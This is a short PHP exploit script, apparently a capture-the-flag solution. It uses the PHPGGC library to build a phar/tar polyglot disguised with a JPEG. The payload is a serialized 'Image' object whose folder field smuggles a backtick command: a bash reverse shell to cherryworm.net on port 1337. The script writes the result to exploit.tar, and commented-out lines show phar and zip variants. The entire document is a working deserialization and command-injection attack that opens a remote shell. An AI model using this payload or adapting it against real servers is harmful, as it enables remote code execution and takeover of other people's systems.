<?php

include("./phpggc/lib/PHPGGC.php");

class Image {
};
$object = new Image;
$object->folder="`bash -c 'bash -i >& /dev/tcp/cherryworm.net/1337 0>&1' >images/h 2>&1`";
$object->file_name="idc";
$object->extension="idc";
$object->tmp_name="idc";

$serialized = serialize($object);
$jpeg="./empty.jpg";
$phar = new \PHPGGC\Phar\Tar($serialized, compact("jpeg"));
file_put_contents('exploit.tar', $phar->generate());

// // $phar = new \PHPGGC\Phar\Phar($serialized, ["prefix"=>"XXXXXXX"]);
// // file_put_contents('exploit.phar', $phar->generate());

// $phar = new \PHPGGC\Phar\Zip($serialized);
// file_put_contents('exploit.zip', $phar->generate());
?>
